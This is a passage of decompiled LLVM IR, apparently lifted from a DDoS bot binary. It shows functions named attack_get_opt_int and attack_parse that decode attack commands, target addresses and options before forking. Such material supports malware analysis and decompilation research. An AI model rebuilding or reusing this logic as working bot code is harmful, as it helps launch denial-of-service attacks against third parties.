  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_822c = icmp eq i32 %arg1, 0
  %v3_8230 = load i32, i32* @r4, align 4
  store i32 %v3_8230, i32* %stack_var_-8, align 4
  %v6_8230 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_822c, label %dec_label_pc_8274, label %dec_label_pc_823c

dec_label_pc_823c:                                ; preds = %entry
  %v0_823c = load i32, i32* %r1.global-to-local, align 4
  %v1_823c = add i32 %v0_823c, 4
  %v2_823c = inttoptr i32 %v1_823c to i8*
  %v3_823c = load i8, i8* %v2_823c, align 1
  %v4_823c = zext i8 %v3_823c to i32
  %v9_8240 = icmp eq i32 %v4_823c, %arg3
  br i1 %v9_8240, label %dec_label_pc_8280, label %dec_label_pc_8264.preheader

dec_label_pc_8264.preheader:                      ; preds = %dec_label_pc_823c
  br label %dec_label_pc_8264

dec_label_pc_8254:                                ; preds = %dec_label_pc_8264
  %v1_8254 = add i32 %v0_825c.in, 12
  %v2_8254 = inttoptr i32 %v1_8254 to i8*
  %v3_8254 = load i8, i8* %v2_8254, align 1
  %v4_8254 = zext i8 %v3_8254 to i32
  %v9_8258 = icmp eq i32 %v4_8254, %arg3
  br i1 %v9_8258, label %dec_label_pc_8280, label %dec_label_pc_8264

dec_label_pc_8264:                                ; preds = %dec_label_pc_8264.preheader, %dec_label_pc_8254
  %v0_825c.in = phi i32 [ %v0_823c, %dec_label_pc_8264.preheader ], [ %v0_825c, %dec_label_pc_8254 ]
  %v0_8264 = phi i32 [ 0, %dec_label_pc_8264.preheader ], [ %v1_8264, %dec_label_pc_8254 ]
  %v0_825c = add i32 %v0_825c.in, 8
  %v1_8264 = add i32 %v0_8264, 1
  %v9_8268 = icmp eq i32 %v1_8264, %arg1
  store i32 %v0_825c, i32* %r1.global-to-local, align 4
  br i1 %v9_8268, label %dec_label_pc_8274, label %dec_label_pc_8254

dec_label_pc_8274:                                ; preds = %dec_label_pc_8264, %dec_label_pc_8280, %entry, %dec_label_pc_828c
  %v2_8278 = phi i32 [ %v3_8230, %dec_label_pc_8280 ], [ %v3_8230, %entry ], [ %v2_8278.pre, %dec_label_pc_828c ], [ %v3_8230, %dec_label_pc_8264 ]
  %v0_8274 = phi i32 [ %arg4, %dec_label_pc_8280 ], [ %arg4, %entry ], [ %v1_828c, %dec_label_pc_828c ], [ %arg4, %dec_label_pc_8264 ]
  store i32 %v2_8278, i32* @r4, align 4
  store i32 %v6_8230, i32* @lr, align 4
  ret i32 %v0_8274

dec_label_pc_8280:                                ; preds = %dec_label_pc_8254, %dec_label_pc_823c
  %v0_8280 = phi i32 [ %v0_823c, %dec_label_pc_823c ], [ %v0_825c, %dec_label_pc_8254 ]
  %v1_8280 = inttoptr i32 %v0_8280 to i32*
  %v2_8280 = load i32, i32* %v1_8280, align 4
  store i32 %v2_8280, i32* @r0, align 4
  %v2_8284 = icmp eq i32 %v2_8280, 0
  br i1 %v2_8284, label %dec_label_pc_8274, label %dec_label_pc_828c

dec_label_pc_828c:                                ; preds = %dec_label_pc_8280
  %v1_828c = call i32 @inet_addr(i32 %v2_8280)
  %v2_8278.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8274

; uselistorder directives
  uselistorder i32 %v1_8264, { 1, 0 }
  uselistorder i32 %v0_825c, { 1, 0, 2 }
  uselistorder i32 %v0_825c.in, { 1, 0 }
  uselistorder i32 %v0_823c, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8274, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8264, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8298 = icmp eq i32 %arg1, 0
  %v3_829c = load i32, i32* @r4, align 4
  store i32 %v3_829c, i32* %stack_var_-8, align 4
  %v6_829c = load i32, i32* @lr, align 4
  br i1 %v2_8298, label %dec_label_pc_82e0, label %dec_label_pc_82a8

dec_label_pc_82a8:                                ; preds = %entry
  %v0_82a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_82a8 = add i32 %v0_82a8, 4
  %v2_82a8 = inttoptr i32 %v1_82a8 to i8*
  %v3_82a8 = load i8, i8* %v2_82a8, align 1
  %v4_82a8 = zext i8 %v3_82a8 to i32
  %v9_82ac = icmp eq i32 %v4_82a8, %arg3
  br i1 %v9_82ac, label %dec_label_pc_82ec, label %dec_label_pc_82d0.preheader

dec_label_pc_82d0.preheader:                      ; preds = %dec_label_pc_82a8
  br label %dec_label_pc_82d0

dec_label_pc_82c0:                                ; preds = %dec_label_pc_82d0
  %v1_82c0 = add i32 %v0_82c8.in, 12
  %v2_82c0 = inttoptr i32 %v1_82c0 to i8*
  %v3_82c0 = load i8, i8* %v2_82c0, align 1
  %v4_82c0 = zext i8 %v3_82c0 to i32
  %v9_82c4 = icmp eq i32 %v4_82c0, %arg3
  br i1 %v9_82c4, label %dec_label_pc_82ec, label %dec_label_pc_82d0

dec_label_pc_82d0:                                ; preds = %dec_label_pc_82d0.preheader, %dec_label_pc_82c0
  %v0_82c8.in = phi i32 [ %v0_82a8, %dec_label_pc_82d0.preheader ], [ %v0_82c8, %dec_label_pc_82c0 ]
  %v0_82d0 = phi i32 [ 0, %dec_label_pc_82d0.preheader ], [ %v1_82d0, %dec_label_pc_82c0 ]
  %v0_82c8 = add i32 %v0_82c8.in, 8
  %v1_82d0 = add i32 %v0_82d0, 1
  %v9_82d4 = icmp eq i32 %v1_82d0, %arg1
  store i32 %v0_82c8, i32* %r1.global-to-local, align 4
  br i1 %v9_82d4, label %dec_label_pc_82e0, label %dec_label_pc_82c0

dec_label_pc_82e0:                                ; preds = %dec_label_pc_82d0, %dec_label_pc_82ec, %entry, %dec_label_pc_82f8
  %v2_82e4 = phi i32 [ %v3_829c, %dec_label_pc_82ec ], [ %v3_829c, %entry ], [ %v2_82e4.pre, %dec_label_pc_82f8 ], [ %v3_829c, %dec_label_pc_82d0 ]
  %v0_82e0 = phi i32 [ %arg4, %dec_label_pc_82ec ], [ %arg4, %entry ], [ %v3_82fc, %dec_label_pc_82f8 ], [ %arg4, %dec_label_pc_82d0 ]
  store i32 %v2_82e4, i32* @r4, align 4
  store i32 %v6_829c, i32* @lr, align 4
  ret i32 %v0_82e0

dec_label_pc_82ec:                                ; preds = %dec_label_pc_82c0, %dec_label_pc_82a8
  %v0_82ec = phi i32 [ %v0_82a8, %dec_label_pc_82a8 ], [ %v0_82c8, %dec_label_pc_82c0 ]
  %v1_82ec = inttoptr i32 %v0_82ec to i32*
  %v2_82ec = load i32, i32* %v1_82ec, align 4
  %v2_82f0 = icmp eq i32 %v2_82ec, 0
  br i1 %v2_82f0, label %dec_label_pc_82e0, label %dec_label_pc_82f8

dec_label_pc_82f8:                                ; preds = %dec_label_pc_82ec
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_82fc = inttoptr i32 %v2_82ec to i8*
  %v3_82fc = call i32 @util_atoi(i8* %v2_82fc, i32 10)
  %v2_82e4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_82e0

; uselistorder directives
  uselistorder i32 %v1_82d0, { 1, 0 }
  uselistorder i32 %v0_82c8, { 1, 0, 2 }
  uselistorder i32 %v0_82c8.in, { 1, 0 }
  uselistorder i32 %v0_82a8, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_82e0, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_82d0, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_8308 = load i32, i32* @r5, align 4
  %v9_8308 = load i32, i32* @r6, align 4
  %v12_8308 = load i32, i32* @r7, align 4
  %v18_8308 = load i32, i32* @sb, align 4
  %v21_8308 = load i32, i32* @sl, align 4
  %v24_8308 = load i32, i32* @fp, align 4
  %v2_830c = icmp ugt i32 %arg2, 2
  %v7_830c = icmp eq i32 %arg2, 3
  store i1 %v7_830c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_8318 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8318, i32* @r5, align 4
  %v2_831c = xor i1 %v7_830c, true
  %v3_831c = and i1 %v2_830c, %v2_831c
  br i1 %v3_831c, label %dec_label_pc_832c, label %dec_label_pc_8320

dec_label_pc_8320:                                ; preds = %dec_label_pc_8370, %.dec_label_pc_8320_crit_edge, %dec_label_pc_8364, %dec_label_pc_8354, %dec_label_pc_832c, %entry, %dec_label_pc_8518
  %v1_8328 = phi i32 [ %v1_8328.pre, %.dec_label_pc_8320_crit_edge ], [ %v1_8330, %dec_label_pc_8370 ], [ %v1_8330, %dec_label_pc_8364 ], [ %v1_8330, %dec_label_pc_8354 ], [ %v1_8330, %dec_label_pc_832c ], [ %v0_8318, %entry ], [ %v0_851c, %dec_label_pc_8518 ]
  store i32 %v6_8308, i32* @r5, align 4
  store i32 %v9_8308, i32* @r6, align 4
  store i32 %v12_8308, i32* @r7, align 4
  store i32 %v18_8308, i32* @sb, align 4
  store i32 %v21_8308, i32* @sl, align 4
  store i32 %v24_8308, i32* @fp, align 4
  ret i32 %v1_8328

dec_label_pc_832c:                                ; preds = %entry
  %v1_832c = inttoptr i32 %v0_8318 to i32*
  %v2_832c = load i32, i32* %v1_832c, align 4
  %v1_8330 = and i32 %v2_832c, 16711680
  store i32 %v1_8330, i32* %r0.global-to-local, align 4
  %v3_8334 = udiv i32 %v2_832c, 16777216
  %v1_8338 = and i32 %v2_832c, 65280
  %v4_833c = udiv i32 %v1_8330, 256
  %v5_833c = or i32 %v4_833c, %v3_8334
  %v4_8340 = mul nuw nsw i32 %v1_8338, 256
  %v5_8340 = or i32 %v5_833c, %v4_8340
  store i32 %v5_8340, i32* %r3.global-to-local, align 4
  %v5_8344 = call i32 @llvm.bswap.i32(i32 %v2_832c)
  store i32 %v5_8344, i32* %r1.global-to-local, align 4
  %v7_8348 = icmp eq i32 %arg2, 4
  store i1 %v7_8348, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8348, label %dec_label_pc_8320, label %dec_label_pc_8354

dec_label_pc_8354:                                ; preds = %dec_label_pc_832c
  %v1_8354 = add i32 %v0_8318, 4
  %v2_8354 = inttoptr i32 %v1_8354 to i8*
  %v3_8354 = load i8, i8* %v2_8354, align 1
  %v4_8354 = zext i8 %v3_8354 to i32
  store i32 %v4_8354, i32* %r3.global-to-local, align 4
  %v7_8358 = icmp eq i32 %arg2, 5
  store i1 %v7_8358, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8358, label %dec_label_pc_8320, label %dec_label_pc_8364

dec_label_pc_8364:                                ; preds = %dec_label_pc_8354
  %v1_8364 = add i32 %v0_8318, 5
  %v2_8364 = inttoptr i32 %v1_8364 to i8*
  %v3_8364 = load i8, i8* %v2_8364, align 1
  %v4_8364 = zext i8 %v3_8364 to i32
  store i32 %v4_8364, i32* @sb, align 4
  %v2_8368 = icmp eq i8 %v3_8364, 0
  store i1 %v2_8368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8368, label %dec_label_pc_8320, label %dec_label_pc_8370

dec_label_pc_8370:                                ; preds = %dec_label_pc_8364
  %v2_8374 = mul nuw nsw i32 %v4_8364, 5
  store i32 %v2_8374, i32* @r7, align 4
  %v1_8378 = add i32 %arg2, -6
  store i32 %v1_8378, i32* %r3.global-to-local, align 4
  %v3_837c = icmp ult i32 %v1_8378, %v2_8374
  %v9_837c = icmp eq i32 %v1_8378, %v2_8374
  store i1 %v9_837c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_837c, label %dec_label_pc_8320, label %dec_label_pc_8384

dec_label_pc_8384:                                ; preds = %dec_label_pc_8370
  store i32 %v4_8364, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_8378, i32* @r6, align 4
  %v2_8390 = call i32 @calloc(i32 %v4_8364, i32 24)
  store i32 %v2_8390, i32* %ip.global-to-local, align 4
  %v0_839c = load i32, i32* @r7, align 4
  %v1_839c = load i32, i32* @r4, align 4
  %v2_839c = sub i32 %v1_839c, %v0_839c
  store i32 %v2_839c, i32* @r7, align 4
  %v0_83a0 = load i32, i32* @r5, align 4
  %v1_83a0 = add i32 %v0_83a0, 11
  store i32 %v1_83a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_83a4

dec_label_pc_83a4:                                ; preds = %dec_label_pc_83a4, %dec_label_pc_8384
  %v1_83a8 = phi i32 [ %v1_83d4, %dec_label_pc_83a4 ], [ %v2_8390, %dec_label_pc_8384 ]
  %v0_83a4 = phi i32 [ %v1_83d0, %dec_label_pc_83a4 ], [ %v1_83a0, %dec_label_pc_8384 ]
  %v1_83a4 = add i32 %v0_83a4, -5
  %v2_83a4 = inttoptr i32 %v1_83a4 to i32*
  %v3_83a4 = load i32, i32* %v2_83a4, align 4
  store i32 %v3_83a4, i32* %r1.global-to-local, align 4
  %v2_83a8 = add i32 %v1_83a8, 16
  %v3_83a8 = inttoptr i32 %v2_83a8 to i32*
  store i32 %v3_83a4, i32* %v3_83a8, align 4
  %v0_83ac = load i32, i32* @r6, align 4
  %v1_83ac = add i32 %v0_83ac, -5
  store i32 %v1_83ac, i32* @r6, align 4
  %v0_83b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_83b0 = add i32 %v0_83b0, -1
  %v2_83b0 = inttoptr i32 %v1_83b0 to i8*
  %v3_83b0 = load i8, i8* %v2_83b0, align 1
  %v0_83b4 = load i32, i32* @r7, align 4
  %v1_83b4 = add i32 %v0_83b4, -6
  store i32 %v1_83b4, i32* %r3.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  %v9_83bc = icmp eq i32 %v1_83ac, %v1_83b4
  store i1 %v9_83bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_83b0, i32* @r4, align 4
  %v2_83c4 = load i32, i32* %ip.global-to-local, align 4
  %v3_83c4 = add i32 %v2_83c4, 20
  %v4_83c4 = inttoptr i32 %v3_83c4 to i8*
  store i8 %v3_83b0, i8* %v4_83c4, align 1
  %v0_83c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_83c8 = load i32, i32* %ip.global-to-local, align 4
  %v2_83c8 = add i32 %v1_83c8, 4
  %v3_83c8 = inttoptr i32 %v2_83c8 to i32*
  store i32 %v0_83c8, i32* %v3_83c8, align 4
  %v0_83cc = load i32, i32* @lr, align 4
  %v1_83cc = trunc i32 %v0_83cc to i16
  %v2_83cc = load i32, i32* %ip.global-to-local, align 4
  %v3_83cc = inttoptr i32 %v2_83cc to i16*
  store i16 %v1_83cc, i16* %v3_83cc, align 2
  %v0_83d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_83d0 = add i32 %v0_83d0, 5
  store i32 %v1_83d0, i32* %r0.global-to-local, align 4
  %v0_83d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_83d4 = add i32 %v0_83d4, 24
  store i32 %v1_83d4, i32* %ip.global-to-local, align 4
  %v0_83d8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83d8, label %dec_label_pc_83dc, label %dec_label_pc_83a4

dec_label_pc_83dc:                                ; preds = %dec_label_pc_83a4
  %v0_83dc = load i32, i32* @r6, align 4
  %v2_83dc = icmp eq i32 %v0_83dc, 0
  store i1 %v2_83dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83dc, label %dec_label_pc_84dc, label %dec_label_pc_83e4

dec_label_pc_83e4:                                ; preds = %dec_label_pc_83dc
  %v0_83e4 = load i32, i32* @r4, align 4
  %v1_83e4 = inttoptr i32 %v0_83e4 to i8*
  %v2_83e4 = load i8, i8* %v1_83e4, align 1
  %v3_83e4 = zext i8 %v2_83e4 to i32
  store i32 %v3_83e4, i32* @r5, align 4
  %v2_83e8 = icmp eq i8 %v2_83e4, 0
  store i1 %v2_83e8, i1* %cpsr_z.global-to-local, align 1
  %v0_83ec = load i32, i32* @r7, align 4
  %v1_83ec = add i32 %v0_83ec, -7
  store i32 %v1_83ec, i32* @r8, align 4
  br i1 %v2_83e8, label %bb, label %dec_label_pc_83f8

bb:                                               ; preds = %dec_label_pc_83e4
  store i32 %v3_83e4, i32* @r6, align 4
  br label %dec_label_pc_84ac

dec_label_pc_83f8:                                ; preds = %dec_label_pc_83e4
  store i32 %v3_83e4, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_8400 = call i32 @calloc(i32 %v3_83e4, i32 8)
  store i32 %v2_8400, i32* %r0.global-to-local, align 4
  %v0_8404 = load i32, i32* @r8, align 4
  %v2_8404 = icmp eq i32 %v0_8404, 0
  store i1 %v2_8404, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8400, i32* @r6, align 4
  br i1 %v2_8404, label %dec_label_pc_84dc, label %dec_label_pc_8410

dec_label_pc_8410:                                ; preds = %dec_label_pc_83f8
  %v0_8410 = load i32, i32* @r4, align 4
  %v1_8410 = add i32 %v0_8410, 1
  %v2_8410 = inttoptr i32 %v1_8410 to i8*
  %v3_8410 = load i8, i8* %v2_8410, align 1
  %v0_8414 = load i32, i32* @r7, align 4
  %v7_8414 = icmp eq i32 %v0_8414, 8
  store i1 %v7_8414, i1* %cpsr_z.global-to-local, align 1
  %v3_8418 = add i32 %v2_8400, 4
  %v4_8418 = inttoptr i32 %v3_8418 to i8*
  store i8 %v3_8410, i8* %v4_8418, align 1
  %v0_841c = load i32, i32* @r4, align 4
  %v1_841c = add i32 %v0_841c, 1
  store i32 %v1_841c, i32* %r3.global-to-local, align 4
  %v0_8420 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8420, label %dec_label_pc_84dc, label %dec_label_pc_8424

dec_label_pc_8424:                                ; preds = %dec_label_pc_8410
  %v1_8424 = add i32 %v0_841c, 2
  %v2_8424 = inttoptr i32 %v1_8424 to i8*
  %v3_8424 = load i8, i8* %v2_8424, align 1
  %v4_8424 = zext i8 %v3_8424 to i32
  store i32 %v4_8424, i32* @r4, align 4
  %v0_8428 = load i32, i32* @r7, align 4
  %v1_8428 = add i32 %v0_8428, -9
  store i32 %v1_8428, i32* @r7, align 4
  %v9_842c = icmp eq i32 %v1_8428, %v4_8424
  store i1 %v9_842c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8424, i32* %r1.global-to-local, align 4
  %v5_8434 = icmp slt i32 %v1_8428, %v4_8424
  br i1 %v5_8434, label %dec_label_pc_84dc, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_8424
  %v7_84344711 = add i32 %v0_841c, 3
  store i32 %v7_84344711, i32* @r8, align 4
  %v6_8438812 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_8438812, i32* @sl, align 4
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_8484

dec_label_pc_8448:                                ; preds = %dec_label_pc_8484
  %v0_8448 = load i32, i32* @r7, align 4
  %v1_8448 = load i32, i32* @r4, align 4
  %v2_8448 = sub i32 %v0_8448, %v1_8448
  store i32 %v2_8448, i32* %r1.global-to-local, align 4
  %v9_8448 = icmp eq i32 %v0_8448, %v1_8448
  store i1 %v9_8448, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8448, label %dec_label_pc_84dc, label %dec_label_pc_8450

dec_label_pc_8450:                                ; preds = %dec_label_pc_8448
  %v3_8450 = mul i32 %v0_84a4, 8
  store i32 %v3_8450, i32* %r3.global-to-local, align 4
  %v1_8454 = load i32, i32* @r8, align 4
  %v2_8454 = add i32 %v1_8454, %v1_8448
  %v3_8454 = inttoptr i32 %v2_8454 to i8*
  %v4_8454 = load i8, i8* %v3_8454, align 1
  %v0_8458 = load i32, i32* @r6, align 4
  %v2_8458 = add i32 %v0_8458, %v3_8450
  store i32 %v2_8458, i32* @sl, align 4
  %v1_845c = add i32 %v2_8448, -1
  store i32 %v1_845c, i32* %r3.global-to-local, align 4
  %v7_845c = icmp eq i32 %v2_8448, 1
  store i1 %v7_845c, i1* %cpsr_z.global-to-local, align 1
  %v3_8460 = add i32 %v2_8458, 4
  %v4_8460 = inttoptr i32 %v3_8460 to i8*
  store i8 %v4_8454, i8* %v4_8460, align 1
  %v0_8464 = load i32, i32* @r4, align 4
  %v1_8464 = load i32, i32* @r8, align 4
  %v2_8464 = add i32 %v1_8464, %v0_8464
  store i32 %v2_8464, i32* %r1.global-to-local, align 4
  %v0_8468 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8468, label %dec_label_pc_84dc, label %dec_label_pc_846c

dec_label_pc_846c:                                ; preds = %dec_label_pc_8450
  %v1_846c = add i32 %v2_8464, 1
  %v2_846c = inttoptr i32 %v1_846c to i8*
  %v3_846c = load i8, i8* %v2_846c, align 1
  %v4_846c = zext i8 %v3_846c to i32
  store i32 %v4_846c, i32* @r4, align 4
  %v0_8470 = load i32, i32* %r3.global-to-local, align 4
  %v1_8470 = add i32 %v0_8470, -1
  store i32 %v1_8470, i32* @r7, align 4
  %v2_8474 = sub i32 %v1_8470, %v4_846c
  %tmp46 = sub i32 0, %v2_8474
  %v6_8474 = and i32 %v1_8470, %tmp46
  %v7_8474 = icmp slt i32 %v6_8474, 0
  %v8_8474 = icmp slt i32 %v2_8474, 0
  %v9_8474 = icmp eq i32 %v1_8470, %v4_846c
  store i1 %v9_8474, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_846c, i32* %r1.global-to-local, align 4
  %v2_847c = xor i1 %v8_8474, %v7_8474
  br i1 %v2_847c, label %dec_label_pc_84dc, label %dec_label_pc_8480

dec_label_pc_8480:                                ; preds = %dec_label_pc_846c
  %v1_8480 = add i32 %v2_8464, 2
  store i32 %v1_8480, i32* @r8, align 4
  br label %dec_label_pc_8484

dec_label_pc_8484:                                ; preds = %.thread10, %dec_label_pc_8480
  %v0_8488 = phi i32 [ %v4_8424, %.thread10 ], [ %v4_846c, %dec_label_pc_8480 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_8488 = add nuw nsw i32 %v0_8488, 1
  store i32 %v2_8488, i32* %r0.global-to-local, align 4
  %v2_848c = call i32 @calloc(i32 %v2_8488, i32 1)
  store i32 %v2_848c, i32* %r0.global-to-local, align 4
  %v0_8490 = load i32, i32* @fp, align 4
  %v1_8490 = add i32 %v0_8490, 1
  store i32 %v1_8490, i32* @fp, align 4
  %v1_8494 = load i32, i32* @sl, align 4
  %v2_8494 = inttoptr i32 %v1_8494 to i32*
  store i32 %v2_848c, i32* %v2_8494, align 4
  %v0_8498 = load i32, i32* @r8, align 4
  store i32 %v0_8498, i32* %r1.global-to-local, align 4
  %v0_849c = load i32, i32* @r4, align 4
  %v3_84a0 = call i32 @util_memcpy(i32 %v2_848c, i32 %v0_8498, i32 %v0_849c)
  store i32 %v3_84a0, i32* %r0.global-to-local, align 4
  %v0_84a4 = load i32, i32* @fp, align 4
  %v1_84a4 = load i32, i32* @r5, align 4
  %v9_84a4 = icmp eq i32 %v0_84a4, %v1_84a4
  store i1 %v9_84a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_84a4, label %dec_label_pc_84ac, label %dec_label_pc_8448

dec_label_pc_84ac:                                ; preds = %dec_label_pc_8484, %bb
  %v0_84ac = call i32 @__GI___errno_location()
  store i32 %v0_84ac, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_84b4 = inttoptr i32 %v0_84ac to i32*
  store i32 0, i32* %v2_84b4, align 4
  %v0_84b8 = call i32 @__libc_fork()
  store i32 %v0_84b8, i32* %r0.global-to-local, align 4
  %v7_84bc = icmp eq i32 %v0_84b8, -1
  %. = zext i1 %v7_84bc to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_84c8 = icmp eq i32 %v0_84b8, 0
  store i1 %v2_84c8, i1* %cpsr_z.global-to-local, align 1
  %tmp49 = icmp slt i32 %v0_84b8, 1
  br i1 %tmp49, label %bb50, label %.thread14

.thread14:                                        ; preds = %dec_label_pc_84ac
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_84dc

bb50:                                             ; preds = %dec_label_pc_84ac
  %v2_84d4 = icmp eq i1 %v7_84bc, false
  store i1 %v2_84d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84d4, label %dec_label_pc_8524, label %dec_label_pc_84dc

dec_label_pc_84dc:                                ; preds = %dec_label_pc_8448, %dec_label_pc_846c, %dec_label_pc_8450, %dec_label_pc_8424, %.thread14, %dec_label_pc_8410, %dec_label_pc_83f8, %dec_label_pc_83dc, %bb50
  store i32 %v2_8390, i32* %r3.global-to-local, align 4
  %v2_84e0 = icmp eq i32 %v2_8390, 0
  store i1 %v2_84e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84e0, label %bb52, label %bb51

bb51:                                             ; preds = %dec_label_pc_84dc
  store i32 %v2_8390, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %dec_label_pc_84dc, %bb51
  store i32 34028, i32* @lr, align 4
  %v1_84e8 = xor i1 %v2_84e0, true
  call void @__pseudo_cond_branch(i1 %v1_84e8, i32 ptrtoint (i32* @global_var_1509c.29 to i32))
  %v0_84ec = load i32, i32* @r6, align 4
  %v2_84ec = icmp eq i32 %v0_84ec, 0
  store i1 %v2_84ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84ec, label %.dec_label_pc_8320_crit_edge, label %dec_label_pc_84f4

.dec_label_pc_8320_crit_edge:                     ; preds = %bb52
  %v1_8328.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8320

dec_label_pc_84f4:                                ; preds = %bb52
  %v0_84f4 = load i32, i32* @r5, align 4
  %v2_84f4 = icmp eq i32 %v0_84f4, 0
  store i1 %v2_84f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84f4, label %dec_label_pc_8518, label %dec_label_pc_84fc

dec_label_pc_84fc:                                ; preds = %dec_label_pc_84f4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_8500

dec_label_pc_8500:                                ; preds = %dec_label_pc_8500, %dec_label_pc_84fc
  %v1_8500 = phi i32 [ 0, %dec_label_pc_84fc ], [ %v1_850c, %dec_label_pc_8500 ]
  %v0_8500 = phi i32 [ %v0_84ec, %dec_label_pc_84fc ], [ %v0_8518.pre, %dec_label_pc_8500 ]
  %v4_8500 = mul i32 %v1_8500, 8
  %v5_8500 = add i32 %v4_8500, %v0_8500
  %v6_8500 = inttoptr i32 %v5_8500 to i32*
  %v7_8500 = load i32, i32* %v6_8500, align 4
  store i32 %v7_8500, i32* %r0.global-to-local, align 4
  %v2_8504 = icmp eq i32 %v7_8500, 0
  store i1 %v2_8504, i1* %cpsr_z.global-to-local, align 1
  store i32 34060, i32* @lr, align 4
  %v1_8508 = xor i1 %v2_8504, true
  call void @__pseudo_cond_branch(i1 %v1_8508, i32 ptrtoint (i32* @global_var_1509c.29 to i32))
  %v0_850c = load i32, i32* @r4, align 4
  %v1_850c = add i32 %v0_850c, 1
  store i32 %v1_850c, i32* @r4, align 4
  %v0_8510 = load i32, i32* @r5, align 4
  %v9_8510 = icmp eq i32 %v0_8510, %v1_850c
  store i1 %v9_8510, i1* %cpsr_z.global-to-local, align 1
  %v0_8518.pre = load i32, i32* @r6, align 4
  br i1 %v9_8510, label %dec_label_pc_8518, label %dec_label_pc_8500

dec_label_pc_8518:                                ; preds = %dec_label_pc_8500, %dec_label_pc_84f4
  %v0_8518 = phi i32 [ %v0_84ec, %dec_label_pc_84f4 ], [ %v0_8518.pre, %dec_label_pc_8500 ]
  store i32 %v0_8518, i32* @r0, align 4
  %v0_851c = call i32 @free()
  store i32 %v0_851c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8320

dec_label_pc_8524:                                ; preds = %bb50
  store i32 ptrtoint (i8** @global_var_24694.31 to i32), i32* %r3.global-to-local, align 4
  %v2_8528 = load i8, i8* bitcast (i8** @global_var_24694.31 to i8*), align 4
  %v3_8528 = zext i8 %v2_8528 to i32
  store i32 %v3_8528, i32* %r0.global-to-local, align 4
  %v2_852c = icmp eq i8 %v2_8528, 0
  store i1 %v2_852c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_852c, label %dec_label_pc_8590, label %dec_label_pc_8534

dec_label_pc_8534:                                ; preds = %dec_label_pc_8524
  store i32 ptrtoint (i32* @global_var_24698.33 to i32), i32* %r3.global-to-local, align 4
  %v2_8538 = load i32, i32* @global_var_24698.33, align 4
  store i32 %v2_8538, i32* %r1.global-to-local, align 4
  %v1_853c = inttoptr i32 %v2_8538 to i32*
  %v2_853c = load i32, i32* %v1_853c, align 4
  store i32 %v2_853c, i32* %ip.global-to-local, align 4
  %v1_8544 = add i32 %v2_853c, 4
  %v2_8544 = inttoptr i32 %v1_8544 to i8*
  %v3_8544 = load i8, i8* %v2_8544, align 1
  %v4_8544 = zext i8 %v3_8544 to i32
